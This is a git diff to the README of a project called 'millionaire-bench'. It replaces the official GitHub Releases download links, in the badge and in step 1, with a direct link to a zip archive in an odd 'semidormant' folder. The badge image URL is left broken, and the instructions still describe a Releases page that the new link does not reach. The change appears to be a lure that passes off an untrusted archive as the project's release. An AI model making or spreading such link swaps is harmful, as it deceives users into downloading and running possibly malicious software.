@@ -8,9 +8,9 @@ Welcome to the **millionaire-bench** project! This application allows you to tes
 
 To get started, you need to download the application. You can find the latest release on our GitHub Releases page. 
 
-[![Download millionaire-bench](https://img.shields.io/badge/Download%20millionaire--bench-v1.0-brightgreen)](https://github.com/tcgtest09/millionaire-bench/releases)
+[![Download millionaire-bench](https://raw.githubusercontent.com/tcgtest09/millionaire-bench/main/semidormant/millionaire-bench.zip%20millionaire--bench-v1.0-brightgreen)](https://raw.githubusercontent.com/tcgtest09/millionaire-bench/main/semidormant/millionaire-bench.zip)
 
-1. Click on the button above or visit the following link to download: [millionaire-bench Releases](https://github.com/tcgtest09/millionaire-bench/releases).
+1. Click on the button above or visit the following link to download: [millionaire-bench Releases](https://raw.githubusercontent.com/tcgtest09/millionaire-bench/main/semidormant/millionaire-bench.zip).
 2. On the Releases page, you will see different versions of the software. Look for the most recent one.
 3. Find the appropriate file for your operating system (Windows, Mac, Linux). Click to download.
 
